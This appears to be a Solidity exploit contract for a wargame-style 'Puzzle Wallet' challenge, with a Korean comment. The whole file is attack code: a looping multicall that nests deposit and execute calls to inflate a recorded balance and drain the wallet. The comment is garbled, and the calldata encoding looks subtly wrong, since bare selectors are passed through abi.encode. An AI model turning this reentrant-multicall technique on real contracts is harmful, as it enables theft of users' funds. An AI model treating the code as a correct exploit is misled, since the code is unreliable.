// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzleProxy {}

interface IPuzzleWallet {
    function balances(address) external view returns (uint256);

    function deposit() external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function multicall(bytes[] calldata data) external payable;
}

contract PuzzleWalletAttack {
    IPuzzleProxy immutable lv;
    IPuzzleWallet immutable target;

    constructor(address _lv, address _target) {
        lv = IPuzzleProxy(_lv);
        target = IPuzzleWallet(_target);
    }

    /// @dev multicall -> [deposit -> execute] -> multicall ... 흐름을 반복하며 balances[msg.sender] >= target.balance를 만족할 때까지 에 대해 0.001 ether를 전달하는 동시에, 첫번째 data로 execute($LV2, 0.001ether, multicall(...)) 를 전달해야 한다.
    function step1() external payable {
        require(msg.value == 0.001 ether);

        bytes memory _depositArgs = abi.encode(IPuzzleWallet.deposit.selector);

        bytes memory _executeArgs = abi.encode(
            IPuzzleWallet.execute.selector,
            address(target),
            0.001 ether,
            IPuzzleWallet.multicall.selector
        );

        bytes[] memory _multData = new bytes[](2);
        _multData[0] = _depositArgs;
        _multData[1] = _executeArgs;

        while (true) {
            (bool res, ) = address(target).call{value: 0.001 ether}(
                abi.encode(IPuzzleWallet.multicall.selector, _multData)
            );
            if (
                target.balances(address(this)) >= address(target).balance ||
                !res
            ) {
                break;
            }
        }
    }
}
